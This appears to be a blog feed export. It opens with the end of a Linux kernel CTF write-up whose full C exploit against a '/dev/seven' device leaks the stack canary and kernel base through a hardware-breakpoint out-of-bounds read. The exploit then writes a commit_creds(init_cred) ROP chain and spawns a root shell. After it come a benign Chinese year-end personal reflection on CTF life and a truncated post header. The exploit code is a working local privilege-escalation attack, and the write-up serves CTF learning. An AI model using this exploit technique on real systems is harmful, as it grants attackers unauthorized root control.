class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> value)</span><br>&#123;<br>    ioctl(dev_fd , <span class="hljs-number">0x7204</span> , value);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">change_rcx</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] write cpu_entry_area DB_STACK -&gt; rcx&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        arb_write(<span class="hljs-number">0x10</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hack_hbp</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">0</span>);<br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">utsname</span>* <span class="hljs-title">uts</span> =</span> (<span class="hljs-keyword">struct</span> utsname*)MMAP_ADDR;<br>    <span class="hljs-type">int</span> oob_idx = (<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname) + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>) - <span class="hljs-number">1</span>) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>);<br>    <br>    <span class="hljs-type">int</span> step = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        raise(SIGSTOP);<br>        <span class="hljs-keyword">switch</span> (step)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            uname(uts);<br>            <span class="hljs-keyword">if</span> (((<span class="hljs-type">uint64_t</span>*)uts)[oob_idx])<br>            &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] OOB Read Stack Data Successfully&quot;</span>);<br>                write(pipe_fd[<span class="hljs-number">1</span>], MMAP_ADDR, MMAP_SIZE);<br>                step++;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Wait for ROP chain&quot;</span>);<br>            <span class="hljs-keyword">if</span> (read(rop_pipe[<span class="hljs-number">0</span>], MMAP_ADDR, MMAP_SIZE) &lt; <span class="hljs-number">0</span>)<br>                err_exit(<span class="hljs-string">&quot;read ROP chain&quot;</span>);<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Get ROP chain successfully&quot;</span>);<br>            step++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Try to write ROP chain&quot;</span>);<br>            <span class="hljs-comment">// path 2</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">prctl_mm_map</span> <span class="hljs-title">mm_map</span>;</span><br>            mm_map.start_code  = <span class="hljs-number">0x1000000</span>;<br>            mm_map.end_code    = <span class="hljs-number">0x1100000</span>;<br>            mm_map.start_data  = <span class="hljs-number">0x1000000</span>;<br>            mm_map.end_data    = <span class="hljs-number">0x1100000</span>;<br>            mm_map.start_brk   = <span class="hljs-number">0x2000000</span>;<br>            mm_map.brk         = <span class="hljs-number">0x2000000</span>;<br>            mm_map.start_stack = <span class="hljs-number">0x1000000</span>;<br>            mm_map.arg_start   = <span class="hljs-number">0x1000000</span>;<br>            mm_map.arg_end     = <span class="hljs-number">0x1000000</span>;<br>            mm_map.env_start   = <span class="hljs-number">0x1000000</span>;<br>            mm_map.env_end     = <span class="hljs-number">0x1000000</span>;<br>            mm_map.auxv        = MMAP_ADDR;<br>            mm_map.auxv_size   = <span class="hljs-number">0x140</span>;<br>            mm_map.exe_fd      = <span class="hljs-number">-2</span>;<br>            prctl(PR_SET_MM, PR_SET_MM_MAP, &amp;mm_map, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> prctl_mm_map), <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br>    ioctl(dev_fd, <span class="hljs-number">0x7201</span>, CPU_ENTRY_AREA_DB_STACK_RCX_ADDR);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>    &#123;<br>        ioctl(dev_fd, <span class="hljs-number">0x7202</span>, <span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">11</span>; i++)<br>    &#123;<br>        ioctl(dev_fd, <span class="hljs-number">0x7202</span>, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    ioctl(dev_fd, <span class="hljs-number">0x7203</span>, <span class="hljs-number">0</span>);<br>    ioctl(dev_fd, <span class="hljs-number">0x7203</span>, <span class="hljs-number">1</span>);<br>    ioctl(dev_fd, <span class="hljs-number">0x7203</span>, <span class="hljs-number">2</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    save_status();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/seven&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open device failed!&quot;</span>);<br><br>    init();<br><br>    mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><br>    pipe(pipe_fd);<br>    pipe(rop_pipe);<br><br>    <span class="hljs-type">pid_t</span> pid1, pid2;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] fork a process to trigger hbp&quot;</span>);<br>    pid1 = fork();<br>    <span class="hljs-keyword">if</span> (!pid1)<br>    &#123;<br>        hack_hbp();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        <br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid1 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid1, <span class="hljs-literal">NULL</span> ,<span class="hljs-literal">NULL</span>);<br>    &#125;<br><br>    pid2 = fork();<br>    <span class="hljs-keyword">if</span> (!pid2)<br>    &#123;<br>        change_rcx();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid2 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<br><br>    create_hbp(pid1, MMAP_ADDR);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fds</span> =</span> &#123; .fd = pipe_fd[<span class="hljs-number">0</span>], .events = POLLIN &#125;;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ptrace(PTRACE_CONT, pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>            err_exit(<span class="hljs-string">&quot;ptrace PTRACE_CONT&quot;</span>);<br>        waitpid(pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br> <br>        <span class="hljs-type">int</span> res = poll(&amp;fds, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (res &gt; <span class="hljs-number">0</span> &amp;&amp; (fds.revents &amp; POLLIN))<br>        &#123;<br>            read(pipe_fd[<span class="hljs-number">0</span>], MMAP_ADDR, MMAP_SIZE);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// waitpid(pid2, NULL, NULL);</span><br><br>    print_binary(MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname), <span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;canary, MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname), <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;leak, MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname) + <span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] canary is 0x%lx\n&quot;</span>, canary);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak is 0x%lx\n&quot;</span>, leak);<br>    kernel_offset = leak - <span class="hljs-number">0xffffffff810d7182</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] kernel offset is 0x%lx\n&quot;</span>, kernel_offset);<br><br>    pop_rdi += kernel_offset;<br>    init_cred += kernel_offset;<br>    commit_creds += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode += kernel_offset;<br><br>    <span class="hljs-built_in">memset</span>(MMAP_ADDR, <span class="hljs-number">0</span> , MMAP_SIZE);<br>    <span class="hljs-type">size_t</span> *rop_chain = MMAP_ADDR;<br>    <span class="hljs-type">int</span> canary_idx = <span class="hljs-number">0x30</span>;<br>    <span class="hljs-type">int</span> idx = <span class="hljs-number">0x37</span>;<br><br>    rop_chain[canary_idx] = canary;<br>    rop_chain[idx++] = pop_rdi;<br>    rop_chain[idx++] = init_cred;<br>    rop_chain[idx++] = commit_creds;<br>    rop_chain[idx++] = swapgs_restore_regs_and_return_to_usermode + <span class="hljs-number">54</span>;<br>    rop_chain[idx++] = <span class="hljs-number">0</span>;<br>    rop_chain[idx++] = <span class="hljs-number">0</span>;<br>    rop_chain[idx++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[idx++] = user_cs;<br>    rop_chain[idx++] = user_rflags;<br>    rop_chain[idx++] = user_sp;<br>    rop_chain[idx++] = user_ss;<br><br><br>    write(rop_pipe[<span class="hljs-number">1</span>], rop_chain, MMAP_SIZE);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ptrace(PTRACE_CONT, pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>            err_exit(<span class="hljs-string">&quot;ptrace PTRACE_CONT&quot;</span>);<br>        waitpid(pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <br><br>    <span class="hljs-comment">// 0xffffc90000247c00</span><br>    <span class="hljs-comment">// canary :0xffffc90000247db8</span><br>    <span class="hljs-comment">// ret_addr = 0xffffc90000247db8</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><p><a href="https://github.com/pray77/CVE-2023-3640/blob/main/README.md">CVE-2023-3640&#x2F;README.md at main · pray77&#x2F;CVE-2023-3640 (github.com)</a></p><p><a href="https://veritas501.github.io/2023_03_22-%E4%B8%80%E7%A7%8D%E5%80%9F%E5%8A%A9%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E7%9A%84%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/">一种借助硬件断点的提权思路分析与演示 (veritas501.github.io)</a></p><p><a href="https://github.com/veritas501/hbp_attack_demo">veritas501&#x2F;hbp_attack_demo: linux kernel LPE using hw_breakpoint attack tech demo (github.com)</a></p><p><a href="https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html">https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Record-of-Learn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023【祭】无为的一年</title>
    <link href="/2023/12/30/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2023/12/30/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p><strong>很多事，我能想通也能接受，但我很难过</strong></p><p>北京这几天又是雾霾，开始怀念大雪后那一抹干净的蔚蓝。走在路上，总有一种吸二手烟的抽象感</p><p>眨眼间2023也就剩最后一天了，看群友都在催年终总结（绷），也感觉确实有写一些东西的必要，来记录我这看似忙碌却又无为的一年</p><p>友情提示，笔者会尽可能减少抽象emoji的使用，但是，谁又能说的准呢🥺🥺🥺</p><h1 id="Technology"><a href="#Technology" class="headerlink" title="Technology"></a>Technology</h1><p>还记得2023的钟声，是在问狐师傅如何学heap中响起的</p><p>年初打了N1 junior &amp;&amp; hgame 2023，被摁在地上使劲摩擦，然后那段时间就是疯狂的刷题</p><p>好在西湖论剑的初赛没白给，虽然是道被打烂的orw，但第一次能在大比赛有输出，还是开心了好久。</p><p>最后山河哥哥差点把web A完了，带我们进了决赛。挺神奇的，为了打西湖临时凑的一支队伍，后来就变成校队了哈哈哈</p><p>打了VNCTF 2023，脑子铸币了，赛时只出了一道题，虽然赛后非预期了P桑出的南通录，but还是耻辱下场呜呜</p><p>怀着试试的心态给VN投了简历，面试的时候高版本的off by null直接歇逼（虽然现在也还是不看板子做不出来的FW，堆风水给爷死啊），最后e宝还是把我放了进去</p><p>后来开始学高版本的堆利用以及进阶知识，这边特别感谢<a href="https://www.roderickchan.cn/">roderick</a>师傅的传授！</p><p>期间经历了D3和阿里云这两重量级的小皮鞭拷打，道心彻底破碎了，然后不知道脑子抽风了还是什么，铸币笔者在4月份开始了kernel的学习</p><p>抱着A3👴的博客生啃了一个月，然后笔者就决定当逃兵了，kernel是一点没学会，A3👴这抽象emoji倒是学会了不少🤪（你说是吧）</p><p>学了点qemu escape、musl libc，但都是浅尝辄止，现在也都忘了差不多了，悲。但是还要感谢可爱男同eeee和pwn king嘉禾师傅能回答我一些有关qemu的问题</p><p>接着就是国赛了，初赛摸了个华北分区第七，太失败了。黑灯搏杀让👴大开眼界</p><p>华北是最早的举行分区赛的，6.10就打了好像。ylb奇特的break &amp; fix，出了三道pwn，没当战犯，最后有点小遗憾吧，拿了个二等奖，毕竟报名的时候是按解题赛模式组的。山河哥哥他们也拿到了去国决的门票，真的太成功了</p><p><img src="/img/2023zongjie/0.jpg"></p><p>国赛过后，渐渐发现自己好像已经厌倦了glibc，于是在Nameless👴的帮助下，我开始了Iot的学习</p><p>很幸运，在暑假拿到了三个CVE编号（CVE-2023-40915 &amp; CVE-2023-40041 &amp; CVE-2023-40042），很不幸，都是低质量水洞，且没有任何实际价值，totolink甚至连国区的技术支持邮箱都down了</p><p>你问我为什么暑假要学iot，是喜欢吗，可能有一点，毕竟是学二进制来第一次接触比较realworld的东西；但是更多的可能是对kernel和chrome的畏惧，终究是个懦夫罢了呜呜😭😭😭。</p><p>期间也浅浅的学习了fuzz，afl++，boo-fuzz，都摸过一点，最初的目的是想学习fuzz以此来自动化挖掘Iot固件，但后来也就不了了之了。</p><p>但是，fuzz真的是个intresting的idea，虽然我现在更多用这个idea来跑C++这种逆不出来的crash。</p><p>楽</p><p>在此感谢winmt王指导和Nameless👴在我学习Iot的过程中提供的帮助！</p><p>九月，终是开学。</p><p>当了校队22届的负责人，事是真的多</p><p>第一次带队去线下，羊城杯，耻辱战败，👴纯纯甲级战犯</p><p>后面又跑了陇剑和蓝帽半决赛，九月份差不多就把这个学期的比赛差旅经费花光了哈哈哈</p><p>国庆回来去参加了专项任务，回来又马不停蹄的举办了招新宣讲，等所有事都告一段落，已经快11月了</p><p>学期已经过半了</p><p>只能感叹：</p><p>​<strong>我荒废了时间，时间便把我荒废了</strong></p><p>专项学了C++，然后就开始给DAS月赛和新生赛出题，DAS那道shaopi真的对不起，给师傅们磕几个呜呜</p><p>说起DAS月赛，这是我们校队第一次举办哈哈，我和周哥还在题目了藏了彩蛋</p><p><img src="/img/2023zongjie/0.png"></p><p><del>S某和B某到底是谁呢？</del></p><p>11月份的几场线上又当战犯了，哎，其实有个别真的挺不想上线的，轩哥快毕业了很忙，能打pwn的就我一个</p><p>好在12月的强网没拖后腿，能做的都做了。但排名还是在32外面呜呜😭😭😭</p><p>哦忘了还有京麒线下，有个神奇的屌图</p><p><img src="/img/2023zongjie/1.jpg"></p><p>你问我们zopchain怎么做出来的，👴也不知道（小声逼逼，当时平台有bug，两道不同的题在1秒内提交flag，只要有一个flag对，两道题都会过check）</p><p>然后，就没有然后了</p><p>我自己也困惑这一年我到底在学什么，年初是heap到年末了好像也还是heap（说的就是你warm up !）</p><p>想了想，兜兜转转还是回到了kernel的起点</p><p>还是忘不了这classic的美学</p><p>md2024👴tm和kernerl只能活一个！</p><h1 id="Life"><a href="#Life" class="headerlink" title="Life"></a>Life</h1><p>今年最重要的事，当然是家里来了个小家伙</p><p><img src="/img/2023zongjie/2.jpg"></p><p>6个月大的小可爱</p><p><img src="/img/2023zongjie/3.jpg"></p><p>10个月大的10斤重的猪眯</p><p><img src="/img/2023zongjie/4.jpg"></p><p>猫猫天下第一！</p><p>7月份的时候，趁着大家在合肥打国决，和VN的小伙伴们面了基</p><p>见到了可爱南童e宝（这B是真娃娃脸啊），可爱温柔又帅气的tel哥哥，素质天花板大B老师，密码超人dbt，还有多很多大师傅</p><p>见识了eeee的究极嘴硬和都是水果的酒杯？（姑且算是酒杯不是水果杯吧）</p><p><img src="/img/2023zongjie/1.png"></p><p>哦，还有神奇的战败区，虽然没有战败CG就是了（差评，噫，我好像也在里面，哒咩！）</p><p><img src="/img/2023zongjie/2.png"></p><p>在去兰州的飞机上，拍了张挺感慨的照。或许这才是千沟万壑吧</p><p><img src="/img/2023zongjie/5.jpg"></p><p>师弟军训结束开断的电线杆，太残暴了</p><p><img src="/img/2023zongjie/6.jpg"></p><p>终于在北京等到了大雪，你说雪景啊还真不记得多少，倒是两个星期的不用早集合印象深刻，终于不是6：10起了妈妈生的</p><p>最黑暗的一集</p><p><img src="/img/2023zongjie/7.jpg"></p><p>从超市买东西回来随手拍的</p><p><img src="/img/2023zongjie/8.jpg"></p><p>还有什么值得回忆的点吗，或许还有吧</p><p>但需要刻意去想的，还叫回忆吗</p><h1 id="Love-0-o"><a href="#Love-0-o" class="headerlink" title="Love ??? 0.o"></a>Love ??? 0.o</h1><p>PASS！！！👴母胎solo19年，连女孩子的手都没牵过呜呜呜</p><p>以前一直奇怪winmt王指导怎么这么想找npy</p><p>没想到我也是小丑🤡🤡🤡🤡🤡🤡🤡</p><h1 id="Work"><a href="#Work" class="headerlink" title="Work"></a>Work</h1><p>转眼大二上就结束了，寒假找了份奇怪的实习（姑且可以这么说吧）</p><p>看看能不能在明年的暑假找一份正经的安全岗实习，或者去上海某中心打工</p><p>虽然未来大概率确定了，但是谁又知道呢🤔🤔🤔</p><p>或许是浙江网安太强，还是因为别的，一直没听到浙江有特招</p><p>但取证和渗透也该开始上手了，毕竟系统里二进制好像真不能当饭吃呜呜呜😭😭😭</p><h1 id="another-thing"><a href="#another-thing" class="headerlink" title="another thing"></a>another thing</h1><p>终究还是没有实力呜呜呜😭😭😭</p><p>明年就和kernel、取证、渗透死磕上了，虽然计划永远赶不上变化就是了</p><p>希望24国赛能保二争一下一吧，👴是真不想打这抽象比赛，但是👴想早点退休，不得不打。啊不对，👴怎么这么自信，万一华北分区寄了不是很尴尬🤔🤔🤔</p><p>尝试多打打国外赛，少一点利益，多一点乐趣，阿门</p><p>明年暑假想去一次北疆或者西藏，捞搭子呜呜</p><p>多出去走走，今年基本上假期都蜗着，我好像一年时间不算上出去比赛，只出了3次校（妈妈生的）。感觉已经是20岁的年龄，40岁的颈椎了呜呜😭😭😭</p><h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p>感谢roderick师傅的无私教导</p><p>感谢winmt、Nameless、wjh、eeee、kortoriseed、P桑等大师傅在学习道路的帮助</p><p>感谢 V&amp;N 的小伙伴们，V&amp;N真的真的是个很棒的team！！！第一次在网络上找到了一个有归属感的地方</p><p>感谢校队0psu3中的每个人，这一年来收获了太多太多</p><p>感谢ice bag这个神奇的群聊中陪我吹水的6个二货</p><p>以及</p><p>感谢屏幕前的你抽出时间读完korey的碎碎念</p><h1 id="The-end"><a href="#The-end" class="headerlink" title="The end"></a>The end</h1><p><strong>凡是过去，皆为序章。</strong></p><p>于<del>百京大兴男子监狱</del>团河</p><p>2023.12.31</p>]]></content>
    
    
    <categories>
      
      <category>shell之外</category>
      
    </categories>
    
    
    <tags>
      
      <tag>碎碎念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于作死试图搓一个32位操作系统不得不说的事</title>
    <link href="/2023/11/20/OS/"/>
    <url>/2023/11/20/OS/</url>
    
